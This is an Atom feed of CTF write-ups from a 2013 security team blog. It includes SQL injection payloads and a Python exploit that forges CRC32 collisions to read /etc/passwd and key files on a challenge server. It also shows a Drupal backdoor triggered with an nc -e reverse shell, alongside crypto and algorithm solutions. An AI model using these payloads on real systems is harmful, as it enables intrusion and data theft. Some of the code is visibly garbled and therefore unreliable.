@@ -1,0 +1,791 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Uncategorized | blue-lotus]]></title>
+  <link href="http://www.blue-lotus.net/www/blog/categories/uncategorized/atom.xml" rel="self"/>
+  <link href="http://www.blue-lotus.net/www/"/>
+  <updated>2013-09-13T01:55:52+08:00</updated>
+  <id>http://www.blue-lotus.net/www/</id>
+  <author>
+    <name><![CDATA[blue-lotus]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[UFOCTF2013 Web100 FlagStore]]></title>
+    <link href="http://www.blue-lotus.net/www/ufoctf2013-web100-flagstore/"/>
+    <updated>2013-07-23T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/ufoctf2013-web100-flagstore</id>
+    <content type="html"><![CDATA[<p>It is a very interesting problem and exhausted our much time and energy.</p>
+
+<p>There are 3 levels.All about sqli.</p>
+
+<p>The first level only needs username and password.After trying for several hours with some common sqli like &#8216; or &#8217;1&#8242;=&#8217;1 and so on but all failed,I accidentally found that &#8221; or &#8220;1&#8243;=&#8221;1 made sense.And @fqj use sqlmap to find the true username and level1_password in the database.(sqlmap also told that the database is sqlite).</p>
+
+<p>The second level needs username,level1&#95;password and level2&#95;password.<em>Note that you must back to level 1 and use true username and password to get to level2 again or you&#8217;ll never go ahead anymore</em>.And seeking for more hours,I find that &#8220;%&#8221; in sqlite can match strings(including empty strings) and &#8220;&#95;&#8221; can match single char.In this level,&#8221;%&#8221; is just the payload.And we use &#8220;&#95;&#8221; to brutefoce the true password.</p>
+
+<p>The third level needs level3&#95;password and a confirm for level3&#95;password.And for payload &#8216; or password like &#8216;%&#8217; &#8212; the site told us that password3.1 passed but password3.2 failed.In confirm blank a mistake happened but we know that the sqli took effect.That is enough,by using &#8220;_&#8221; we can bruteforce the true password(if the site told us only password 3.2 failed then it makes sense).</p>
+
+<p>@H.Shao wrote the script to find the password for level2 and level3 and finally got the FLAG.There is trap in level3,because there is &#8220;&#95;&#8221; in the level3&#95;password and this time &#8220;&#95;&#8221; doesnt represent any single char but just &#8220;_&#8221;.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SIGINT 2013 crypto300 satisfaction]]></title>
+    <link href="http://www.blue-lotus.net/www/sigint-2013-crypto300-satisfaction/"/>
+    <updated>2013-07-10T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/sigint-2013-crypto300-satisfaction</id>
+    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/">http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/</a></p>
+
+<h1><a href="http://slipper.tk/writeup/2013/07/11/sigint-2013-crypto-satisfaction/">SIGINT 2013 crypto300 satisfaction</a></h1>
+
+<p>Description</p>
+
+<pre><code>Something fishy going on:
+you need this
+188.40.147.108 2000
+This flag does not have a SIGINT_ prefix!
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/server.rb">server.rb</a></p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/bf.rb">bf.rb</a></p>
+
+<p>The server only runs properly RSA signed brainfuck code.</p>
+
+<pre><code>def valid?(code, cert)
+  return false unless code =~ /\A[\[\]+\-\. ]+\Z/
+  return false unless cert =~ /\A\d+\Z/
+  sig = cert.to_i
+  crc = crc32(code)
+  test = crc.to_bn.mod_exp($d, $n)
+  return sig == test
+end
+
+  if(valid_cert)
+    puts "got valid code: #{code.inspect}"
+    ruby_code = bfdo(code)
+    puts "got some ruby code: #{ruby_code.inspect}"
+    client.puts eval(ruby_code)
+</code></pre>
+
+<p>If the brainfuck code which we submit only contains <code>+-[].</code>, then the sever will calculate the crc of the code and check if it matches the signature.<br/>
+Then how does <code>crc32()</code> work? The code in the script seems different from classic <a href="http://en.wikipedia.org/wiki/Crc32">CRC32</a>.</p>
+
+<pre><code>def crc32(str)
+  mask = 0x04C11DB7
+  crc = 0
+  str.bytes.each do |byte|
+    byte.to_s(2).rjust(8,"0").each_char do |bit|
+      h_crc_bit = ( (( crc &amp;amp; 0x80_00_00_00) != 0) ? 1 : 0)
+      h_byte_bit = bit.to_i
+      if  h_crc_bit == h_byte_bit
+        crc = ((crc &amp;lt;&amp;lt; 1)^mask) &amp;amp; 0xffffffff
+      else
+        crc = (crc &amp;lt;&amp;lt; 1) &amp;amp; 0xffffffff
+      end
+    end
+  end
+  return crc
+end
+</code></pre>
+
+<p>Standard CRC32 is the remainder of a polynomial division of the target string. In practice it employs the finite field GF(2). XOR is equivalent to division in GF(2).<br/>
+As a hash function, CRC32 is easy to collision.<br/>
+In the code above, XOR was taken when <code>h_crc_bit == h_byte_bit</code>.<br/>
+However, in standard CRC32, it should be <code>h_crc_bit == 1 &amp;amp;&amp;amp; h_byte_bit == 1</code><br/>
+Maybe the new crc32 is more likely to collision.</p>
+
+<p>To study this algorithm, I rewrite it in C++.</p>
+
+<pre><code>unsigned int CRC32_bit(unsigned char data[], int len)
+{
+        unsigned int r = 0;
+        unsigned int s;
+        for (int i = 0; i &amp;lt; len; i++) {
+                s = data[i] &amp;lt;&amp;lt; 24;
+                for (int j = 0; j &amp;lt; 8; j++) {
+                        if (!((r ^ s) &amp;amp; 0x80000000))
+                        //instead of if (r &amp;amp; 0x80000000)
+                                r = (r &amp;lt;&amp;lt; 1) ^ POLY;
+                        else
+                                r = r &amp;lt;&amp;lt; 1;
+                        s = s &amp;lt;&amp;lt; 1;
+                }
+        }
+        return r;
+}
+</code></pre>
+
+<p>In this problem, it seems that we can&rsquo;t sign the code because we don&rsquo;t know the constants in <code>./rsa_keys.rb</code>.<br/>
+The basic idea is very simple. If we keep the <code>crc=0</code> or <code>crc=1</code>, then signature is always the same with crc(0 or 1). Now we just need to find something excutable whose crc is 0 or 1.</p>
+
+<p>First we should write a brainfuck program whose output is a legal ruby code, then append some useless character to the code to make its crc be 0 or 1.</p>
+
+<p>A simple brainfuck programmer is like this</p>
+
+<pre><code>def bf(s):
+        p = 0
+        q = 0
+        K = 48
+        ret = &amp;#039;&amp;#039;
+        now = 0
+        for c in s:
+            if ord(c) &amp;lt; K:
+                    if (now != 0):
+                            ret += &amp;#039;&amp;lt;&amp;#039;
+                            now = 0
+                    while (p  ord(c)):
+                            p -= 1
+                            ret += '-'
+            else:                                                                                                                                                                             
+                    if (now != 1):                                                                                                                                                            
+                            ret += '&amp;gt;'                                                                                                                                                        
+                            now = 1                                                                                                                                                           
+                    while (q  ord(c)):
+                            q -= 1
+                            ret += '-'
+            ret += '.'
+    return ret
+</code></pre>
+
+<p>My code is kind of ugly but it does work. (The brainfuck code length is limited to 1000)</p>
+
+<p>Given a crc sum and a byte we can calculate the next crc sum directly.</p>
+
+<pre><code>inline unsigned int extend(unsigned int r, unsigned char s)
+{
+        return (r &amp;lt;&amp;gt; 24) ^ s];
+}
+</code></pre>
+
+<p><code>crc_table</code> is a pre-calculated table.</p>
+
+<p>If the crc sum is 0, then `r &lt;> 8;<br/>
+x |= (i ^ s) &lt;&lt; 24;<br/>
+if (extend(x, s) == r) {<br/>
+//some code<br/>
+}<br/>
+}<br/>
+}</p>
+
+<p>But charset that we can use is limited, so we don&rsquo;t need to worry about too many solutions.</p>
+
+<p>I used a bidirectional search algorithm to speed up my search in my code.<br/>
+<a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/crc32.cpp">crc32.cpp</a></p>
+
+<p>It works well even I only use <code>+-</code> to generate collisions.</p>
+
+<pre><code>import subprocess
+from time import sleep
+from socket import *
+
+...
+
+if __name__ == '__main__' :
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect(('188.40.147.108', 2000))
+        print s.recv(1024)
+        #raw = bf("""client.puts File.readlines("/etc/passwd")#""")
+        #raw = bf("""client.puts File.readlines("./the_flag.rb")#""")
+        raw = bf("""client.puts File.readlines("./rsa_keys.rb")#""")
+
+        p = subprocess.Popen("./crc32", stdin = subprocess.PIPE, stdout = subprocess.PIPE)
+        p.stdin.write(str(len(raw)) + "\n")
+        p.stdin.write(raw + "\n")
+        suffix = p.stdout.read()
+
+        payload = raw + suffix
+
+        print len(payload)
+        print payload
+
+        s.send(payload + "\n")
+        s.send("1\n")
+        sleep(5)
+        print s.recv(4096)
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/go.py">go.py</a><br/>
+Then I read <a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/the_flag.rb">./the_flag.rb</a> and <a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/satisfaction/rsa_keys.rb">./rsa_keys.rb</a>.</p>
+
+<p>The FLAG is <code>goozbartouuu</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SIGINT 2013 crypto 200 rsa]]></title>
+    <link href="http://www.blue-lotus.net/www/sigint-2013-crypto-200-rsa/"/>
+    <updated>2013-07-10T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/sigint-2013-crypto-200-rsa</id>
+    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/">http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/</a></p>
+
+<h1><a href="http://slipper.tk/writeup/2013/07/10/sigint-2013-crypto-rsa/">SIGINT2013 crypto200 rsa</a></h1>
+
+<p>Description</p>
+
+<pre><code>Cryptography is difficult
+authorized_keys
+ssh to challenge@188.40.147.109
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/genrsa.py">genrsa.py</a></p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/authorized_keys">authorized_keys</a></p>
+
+<p>challenge@188.40.147.109的ssh密钥是用genrsa.py生成的。</p>
+
+<pre><code>SEED = int(time())
+def randfunc(n):
+    def rand():
+        global SEED
+        ret = SEED*0x1333370023004200babe004141414100e9a1192355de965ab8cc1239cf015a4e35 + 1
+        SEED = ret
+        return (ret &amp;gt;&amp;gt; 0x10) &amp;amp; 0x7fff
+    ret = ""
+    while len(ret)  id_rsa.pub &amp;amp;&amp;amp; rm pub")`显然非常慢。更好的办法是从公钥中解出N，每次比较生成的N是否相同。
+</code></pre>
+
+<p>RSAPublicKey的结构：</p>
+
+<ul>
+<li>The key type</li>
+<li>A chunk of PEM-encoded data</li>
+<li>A comment</li>
+</ul>
+
+
+<p>PEM是<a href="http://en.wikipedia.org/wiki/Base64#Privacy-enhanced_mail">Privacy Enhanced Mail</a>的缩写。<br/>
+对于ssh密钥，PEM是由一些小数据块(big-endian)组成的。每一块前面是数据长度，后面就是数据。</p>
+
+<pre><code>def b2i(s):
+        ret = 0L
+        for i in s:
+                ret = (ret &amp;lt;&amp;gt; 0x10) &amp;amp; 0xff
+    ret = ""
+    while len(ret) &amp;lt; n:
+        ret += chr(rand())
+    return ret
+
+def guess(x):
+        global seed
+        seed = x
+        keypair = RSA.generate(1024, randfunc)
+        if  getattr(keypair, &amp;#039;n&amp;#039;) != N :
+            return False
+        print getattr(keypair, &amp;#039;n&amp;#039;), x
+        return True
+
+if __name__ == &amp;#039;__main__&amp;#039;:
+    #now = 1373041808
+    now = 1373038672    #answer
+    while (not guess(now)):
+            now -= 1
+            print now
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/my.py">my.py</a></p>
+
+<p>SIGINT_some_people_pay_100_euro_for_this<br/>
+<a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/crypto/rsa/flag">flag</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SIGINT 2013 cloud200 bloat]]></title>
+    <link href="http://www.blue-lotus.net/www/sigint2013-cloud200-bloat/"/>
+    <updated>2013-07-09T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/sigint2013-cloud200-bloat</id>
+    <content type="html"><![CDATA[<p><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/</a></p>
+
+<h1><a href="http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/">SIGINT 2013 cloud 200 bloat</a></h1>
+
+<p>Description</p>
+
+<pre><code>My friend set up this site for me. I don't trust him.
+He installed a backdoor for sure. Can you find it?
+He just wrote me, what this system is using.
+Somehow it looks diff-erent o_O:
+</code></pre>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/cdd-7.20.tar_0.gz">cdd-7.20.tar_0.gz</a></p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/source_code.tar.bz2">source_code.tar.bz2</a></p>
+
+<p>这道题比赛的时候只有一个队伍做出来。虽然只有200分，但过程比较复杂。</p>
+
+<p>我本来预期花一两个小时就能解决这个问题，结果却耗费了四个小时。</p>
+
+<p>首先也是最关键的问题就是如何找到后门。</p>
+
+<p>这个网站使用的是开源系统drupal 7.20，还附带了一些插件。但问题并不是直接diff那么简单。</p>
+
+<p>官方的源码附有详细的注释，但修改版中将所有注释全部删掉了，还把代码风格从K&amp;R风格改成了一种很混乱的样子，甚至将所有的变量名替换成了奇奇怪怪的东西。</p>
+
+<p>手工查找人眼识别几乎是不可行的。必须想其它办法。</p>
+
+<p>比赛的时候卡在其他题上面了，没有时间仔细看这道题。事后才想起来可以写一个文本处理器，把php文件全部“格式化”一遍：去掉注释+统一格式+统一变量命名。</p>
+
+<p><a href="https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/filter.cpp">PHP_filter.cpp</a></p>
+
+<p>处理注释是最麻烦的一步，要判断引号和各种注释符，最终版本的代码也还有瑕疵。</p>
+
+<p>因为只需要比对出文件的不同之处，所以不需要维护代码风格和变量名。为了统一，我把所有可能换行的<code>{};,:()</code>全都强行换行，又将所有变量名指定成了$000。</p>
+
+<p>用这个非常挫的文本处理器半自动操作，效率已经比人眼识别提升很多，而且出错率降低很多。</p>
+
+<p>但是将所有<code>.php</code>文件对比之后并没有什么收获。</p>
+
+<p>再去查看源码中的文件，发现<code>.php</code>的文件其实并不多。很多插件都是以<code>.inc\.module</code>这样的后缀结尾的。</p>
+
+<p>再扫描一遍<code>.inc</code>后缀的文件，果然发现有一个文件<code>./bloat/modules/openid/openid.inc</code>略有不同。</p>
+
+<pre><code>10 define('OPENID_DH_DEFAULT_GEN', '86');
+</code></pre>
+
+<p>而原版中的openid是</p>
+
+<pre><code>22 /**
+23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
+24  */
+25 define('OPENID_DH_DEFAULT_GEN', '2');
+</code></pre>
+
+<p>这是跟用户认证有关的一个常量。修改这种值也许会造成认证系统的一些缺陷。</p>
+
+<p>继续看代码，我有了更大的收获。</p>
+
+<p>在<code>./bloat/modules/openid/openid.module</code>中代码逻辑与原版有明显的不同。</p>
+
+<pre><code>197 function openid_login_validate($quench, &amp;amp;$tickers)
+198    {
+199 $return_to = $tickers['values']['openid.return_to'];
+...
+204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
+... 
+207      function openid_begin($imaginably, $overlay = '', $termination = array())
+...
+212       if(strpos($imaginably, '@'))
+213   {
+214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
+215 }
+216 else
+217     {
+218      $user = false;
+219      $host = false;
+220      }
+</code></pre>
+
+<p><code>214    list($user, $host) = explode('@', $imaginably, 2);</code>中<code>$imaginably</code>正是用户提交的认证用户名。</p>
+
+<p>再来看看这些变量做了什么。</p>
+
+<pre><code>248 $user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
+249     $service['uri'] = drupal_map_assoc(array($host), $user_enc);
+259   openid_redirect($service['uri'], $ramparts);
+</code></pre>
+
+<p>这里用到了修改过的常量<code>OPENID_DH_DEFAULT_GEN</code>。</p>
+
+<p>drupal&#95;map&#95;assoc()返回的是数组，所以在redirect过程中会被强转成字符串&#8221;Array&#8221;，最后在跳转的时候会出错。</p>
+
+<p>而这个<a href="https://api.drupal.org/api/drupal/includes%21common.inc/function/drupal_map_assoc/7">drupal&#95;map&#95;assoc()</a>则暗藏玄机。</p>
+
+<p>根据官方文档，drupal&#95;map&#95;assoc()会把第一个参数$array中的每个参数依次传入第二个参数$callable执行并返回一个数组。</p>
+
+<p>这里藏着一个命令执行后门啊。。。。</p>
+
+<p>只要<code>is_callable($user_enc)</code>就能直接执行<code>$user_enc($host)</code>。</p>
+
+<p>而<code>$user_enc</code>是从<code>$user * OPENID_DH_DEFAULT_GEN</code>解出来的。</p>
+
+<p>因为<code>OPENID_DH_DEFAULT_GEN</code>的限制，所以这个<code>$user_enc</code>必须是按照base64解成整形之后能整除86（中间还有一些过程）。</p>
+
+<p>现在要做的就是找一个合适的函数，恰好能满足这个条件了。</p>
+
+<pre><code>slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
+Interactive shell
+
+php &amp;gt; include './openid.inc';
+php &amp;gt; var_dump(is_callable('system'));
+bool(true)
+php &amp;gt; var_dump(is_callable('systeM'));
+bool(true)
+php &amp;gt; echo _openid_dh_base64_to_long('system')/OPENID_DH_DEFAULT_GEN ."\n";
+34952922.72093
+php &amp;gt; echo _openid_dh_base64_to_long('System')/OPENID_DH_DEFAULT_GEN ."\n";
+14664196.395349
+php &amp;gt; echo _openid_dh_base64_to_long('SYstem')/OPENID_DH_DEFAULT_GEN ."\n";
+14347185.046512
+php &amp;gt; echo _openid_dh_base64_to_long('eval')/OPENID_DH_DEFAULT_GEN ."\n";
+93703.872093023
+php &amp;gt; echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
+93802
+</code></pre>
+
+<p>因为这里的is&#95;callable是不区分大小写的，本来我还以为后门作者刻意选择了大小写混用的函数名，本来差点要写程序暴搜的。还好偶然发现exec正好符合要求。^&#95;^</p>
+
+<p><strong>如果以后要用这种方法做后门，记得一个有大因子的大小写混用的函数名哦。</strong></p>
+
+<p>接下来就是命令执行了。</p>
+
+<p>可是用<code>93802@echo a &amp;gt; a</code>结果并没有生成文件a。似乎对网站的目录木有写权限。</p>
+
+<p>如果要获取flag，必须要有传递信息的途径。</p>
+
+<p>唯一能想到的方法就只有反连了。</p>
+
+<p>幸运的是服务起的nc有-e选项，正好可以交互，不然还得一次一次地执行命令。</p>
+
+<p>用<code>93802@nc x.x.x.x 8080 -e /bin/sh</code>反弹，本地用<code>nc -l 8080</code>监听。</p>
+
+<pre><code>pwd
+/var/www
+ls -la ./
+total 7904
+drwxr-xr-x  9 root root    4096 Jul  5 01:23 .
+drwxr-xr-x 14 root root    4096 Jul  5 01:53 ..
+-rw-r--r--  1 root root   75028 Mar  7 17:26 CHANGELOG.txt
+-rw-r--r--  1 root root    1481 Mar  7 17:26 COPYRIGHT.txt
+...
+-rw-r--r--  1 root root      34 Jul  5 01:01 ___F_L_A_G___
+...
+cat ___F_L_A_G___
+not here, see /flag on filesystem
+cat /flag
+SIGINT_d4b0844c
+</code></pre>
+
+<p>看来果然是木有写权限～～</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 OMGACM 4 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-4-writeup/"/>
+    <updated>2013-06-18T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-omgacm-4-writeup</id>
+    <content type="html"><![CDATA[<h1>Problem Description</h1>
+
+<p>Each problem gives you a circuit board, which will have a dimension, a set of nulls (that trace cannot go through), a feed point, and a set of antenna points.</p>
+
+<p>Your goal is to draw a trace for each antenna point that starts at the feed point, ends at the antenna point and does not intersect other traces.</p>
+
+<p>The distance of these traces must also be equal for all antenna points.</p>
+
+<h1>Our Solution</h1>
+
+<p>Since we intuitively classify this problem as NP-Complete, we resort to iterative deepening depth-first search for solving it.</p>
+
+<p>In our algorithm, we choose to &#8220;grow&#8221; the traces from antenna points, which means that all the traces simultaneously start from their respective antenna point and go one step further one by one.</p>
+
+<p>This strategy forces that all the traces will be equal length with each other, thus many unnecessary states are avoided.</p>
+
+<p>And if one trace encounters with another trace before reaching the feed point, we can simply merge them into one to eschew intersection.</p>
+
+<p>More specifically, in order to record the current state, we use:</p>
+
+<ol>
+<li>Nine bool variables for each point: one for the point and 8 for adjacent edges;</li>
+<li>One pair &lt; int, int > (one for 1 and the other for sqrt 2) variable for each point to store the distance from this point to the corresponding antenna point if it has been covered by a trace;</li>
+<li>Current &#8220;growing&#8221; point for each trace;</li>
+<li>Which trace’s turn is it to grow in this iteration;</li>
+<li>The final distance, if one of the traces has reached the feed point;</li>
+</ol>
+
+
+<p>And we also use a set of pruning tricks to accelerate the algorithm.</p>
+
+<ol>
+<li>Iterative deepening on length of each path;</li>
+<li>Limit the depth of dfs to be at most 30. (This ought to have been another iterative deepening argument, but we hard code it with an empirical number for simplifying the code);</li>
+<li>Preprocess the minimal distance from each point to the feed point and combine this information with iterative deepening threshold for further pruning;</li>
+<li>If one of the trace has already reached the feed point, use the distance for pruning.</li>
+</ol>
+
+
+<p>Here is another tip:</p>
+
+<p>The intersections will not only happen at points but also in small squares, you may need to double check this.</p>
+
+<h1>Code</h1>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;map&gt;
+#include &lt;set&gt;
+#include &lt;vector&gt;
+#include &lt;queue&gt;
+#include &lt;string.h&gt;
+using namespace std;
+
+typedef unsigned long long llu;
+#define MAX 100
+#define mp make_pair
+#define pb push_back
+
+bool Null[MAX][MAX], Null2[MAX][MAX];
+int XY[MAX][MAX];
+int N, M, eN, fX, fY, P, UP;
+int dy[] = {1, 0, -1, 1, -1, 1, 0, -1};
+int dx[] = {1, 1, 1, 0, 0, -1, -1, -1};
+int verse[] = {8, 7, 6, 5, 4, 3, 2 , 1};
+set&lt;vector&lt;bool&gt; &gt; S;
+pair&lt;int, int&gt; dp[] = {
+    mp(0, 1),
+    mp(1, 0),
+    mp(0, 1),
+    mp(1, 0),
+    mp(1, 0),
+    mp(0, 1),
+    mp(1, 0),
+    mp(0, 1)
+};
+
+struct node {
+    vector&lt;bool&gt; t;
+    vector&lt;pair&lt;int, int&gt; &gt; len;
+    int cnt;
+    pair&lt;int, int&gt; ans;
+    vector&lt;pair&lt;int, int&gt; &gt; now;
+    vector&lt;bool &gt; used;
+    int I;
+};
+node Key;
+
+int get(int x, int y) {
+    return x*M + y;
+}
+
+pair&lt;int, int&gt; getLen(int j) {
+    return mp(Key.len[get(Key.now[Key.I].first, Key.now[Key.I].second)].first+dp[j].first, 
+        Key.len[get(Key.now[Key.I].first, Key.now[Key.I].second)].second+dp[j].second);
+}
+
+void output(node ans) {
+    printf("Solution %d\n", P);
+    int kk=0, L=0;
+    for (int i=0; i&lt;N*M; i++) {
+        kk++;
+        int tx = i / M;
+        int ty = i % M;
+        for (int j=0; j&lt;4; j++, kk++) {
+            if (ans.t[kk])
+                L++;
+        }
+        kk+=4;
+    }
+    printf("Line %d\n", L);
+    int k=0;
+    for (int i=0; i&lt;N*M; i++) {
+        k++;
+        int tx = i / M;
+        int ty = i % M;
+        for (int j=0; j&lt;4; j++, k++) {
+            if (ans.t[k])
+                printf("Segment %d %d %d %d\n", tx, ty, tx+dx[j], ty+dy[j]);
+        }
+        k+=4;
+    }
+}
+
+bool none() {
+    for (int i=0; i&lt;eN; i++)
+        if (Key.used[i]) return false;
+    return true;
+}
+
+int myabs(int xx) {
+    if (xx&lt;0) return -xx;
+    return xx;
+}
+
+
+int UPPER_BOUND = 28;
+void dfs(int depth) {
+    if (depth &gt; UPPER_BOUND) return;
+
+    int x = Key.now[Key.I].first;
+    int y = Key.now[Key.I].second;
+
+    int i = rand() % 8;
+    for (int iii=0; iii&lt;8; iii++, i=(i+1)%8) {
+        int newX = x + dx[i];
+        int newY = y + dy[i];
+
+        if (newX &lt; 0 || newX &gt;= N) continue;
+        if (newY &lt; 0 || newY &gt;= M) continue;
+        if (Null[newX][newY]) continue;
+        if (XY[newX][newY] == -1 || getLen(i).first + getLen(i).second + XY[newX][newY] &gt; UP) continue;
+        if (Key.cnt &gt; 0 &amp;&amp;
+                            (Key.ans.first &lt; getLen(i).first || Key.ans.second &lt; getLen(i).second) ) continue;
+        if (Key.cnt &gt; 0 &amp;&amp;
+                            (Key.ans.first == getLen(i).first &amp;&amp; Key.ans.second == getLen(i).second) ) continue;
+
+
+        if (i == 0) {
+            if (Key.t[get(x+1, y) * 9 + 6]) continue;
+        }
+        if (i == 2) {
+            if (Key.t[get(x+1, y) * 9 + 8]) continue;
+        }
+        if (i == 7) {
+            if (Key.t[get(x, y-1) * 9 + 6]) continue;
+        }
+        if (i == 5) {
+            if (Key.t[get(x, y+1) * 9 + 8]) continue;
+        }
+
+
+        if (newX == fX &amp;&amp; newY == fY) {
+            if (Key.cnt &gt; 0 &amp;&amp; Key.ans != getLen(i)) continue;
+            Key.cnt++; Key.ans = getLen(i);
+            Key.t[(newX*M + newY)*9 + verse[i]] = true;
+            Key.t[get(x, y)*9 + i + 1] = true;
+            Key.used[Key.I] = false;
+            Key.now[Key.I] = mp(newX, newY);
+
+
+            if (Key.cnt &gt; 0 &amp;&amp; none()) {
+                output(Key);
+                exit(0);
+            }
+
+            int II = Key.I, ttt = 0;
+            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
+                if (Key.used[Key.I])
+                    break;
+            if (ttt &lt; eN) {
+                dfs(depth+1);
+            }
+
+            Key.t[(newX*M + newY)*9 + verse[i]] = false;
+            Key.t[get(x, y)*9 + i + 1] = false;
+            Key.I = II;
+            Key.used[Key.I] = true;
+            Key.now[Key.I] = mp(x, y);
+            Key.cnt--;
+        } else if (Key.t[get(newX, newY) * 9]) {
+            if (Key.len[newX*M + newY] != getLen(i)) continue;
+
+            Key.t[(newX*M + newY)*9 + verse[i]] = true;
+            Key.t[get(x, y)*9 + i + 1] = true;
+            Key.used[Key.I] = false;
+            Key.now[Key.I] = mp(newX, newY);
+
+            int II = Key.I, ttt = 0;
+            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
+                if (Key.used[Key.I])
+                    break;
+            if (ttt &lt; eN) {
+                dfs(depth+1);
+            }
+
+            Key.t[(newX*M + newY)*9 + verse[i]] = false;
+            Key.t[get(x, y)*9 + i + 1] = false;
+            Key.I = II;
+            Key.used[Key.I] = true;
+            Key.now[Key.I] = mp(x, y);
+        } else {
+            Key.t[(newX*M + newY)*9] = true;
+            Key.t[(newX*M + newY)*9 + verse[i]] = true;
+            Key.t[get(x, y)*9 + i + 1] = true;
+            Key.len[newX*M + newY] = getLen(i);
+            Key.now[Key.I] = mp(newX, newY);
+
+            int II = Key.I, ttt = 0;
+            for (Key.I=(Key.I+1)%eN; ttt&lt;eN; ttt++, Key.I=(Key.I+1)%eN)
+                if (Key.used[Key.I])
+                    break;
+            if (ttt &lt; eN) {
+                dfs(depth+1);
+            }
+
+            Key.t[(newX*M + newY)*9] = false;
+            Key.t[(newX*M + newY)*9 + verse[i]] = false;
+            Key.t[get(x, y)*9 + i + 1] = false;
+            Key.I = II;
+            Key.now[Key.I] = mp(x, y);
+        }
+    }
+}
+
+void dfs2(int x, int y) {
+    for (int i=0; i&lt;8; i++) {
+        int newX = x + dx[i];
+        int newY = y + dy[i];
+
+        if (newX &lt; 0 || newX &gt;= N) continue;
+        if (newY &lt; 0 || newY &gt;= M) continue;
+        if (Null[newX][newY]) continue;
+
+        if (XY[newX][newY] != -1 &amp;&amp; XY[newX][newY] &lt;= XY[x][y] + 1) continue;
+        XY[newX][newY] = XY[x][y] + 1;
+        dfs2(newX, newY);
+    }
+}
+
+void solve() {
+    scanf("%*s%d", &amp;P);
+
+    scanf("%*s%*d");
+    scanf("%d%d", &amp;N, &amp;M);
+
+    scanf("%*s%*d");
+    scanf("%d%d", &amp;fX, &amp;fY);
+
+
+
+    Key.t.resize(N * M * 9);
+    Key.len.resize(N * M);
+
+    scanf("%*s%d", &amp;eN);
+    for (int i=0; i&lt;eN; i++) {
+        int tx, ty;
+        scanf("%d%d", &amp;tx, &amp;ty);
+
+        Key.now.pb(mp(tx, ty));
+        Key.t[get(tx, ty) * 9] = true;
+        Key.used.pb(true);
+    }
+
+    int nN;
+    scanf("%*s%d", &amp;nN);
+    memset(Null, 0, sizeof(Null));
+    memset(Null2, 0, sizeof(Null2));
+    for (int i=0; i&lt;nN; i++) {
+        int tx, ty;
+        scanf("%d%d", &amp;tx, &amp;ty);
+        Null[tx][ty] = true;
+        Null2[tx][ty] = true;
+    }
+
+
+
+    memset(XY, -1, sizeof(XY));
+    XY[fX][fY] = 0;
+    dfs2(fX, fY);
+
+    node base = Key;
+    for (UP=6; ; UP++) {
+        dfs(0);
+        Key = base;
+    }
+}
+
+int main() {
+    solve();
+}
+</code></pre>
+
+<h1>Result</h1>
+
+<p>You can check out <a href="http://ascii.io/a/3644">http://ascii.io/a/3644</a> for the result.</p>
+
+<p><strong>CAVEAT:</strong> We use many heuristics in the program, so it will not guarantee success for every run.</p>
+]]></content>
+  </entry>
+  
+</feed>
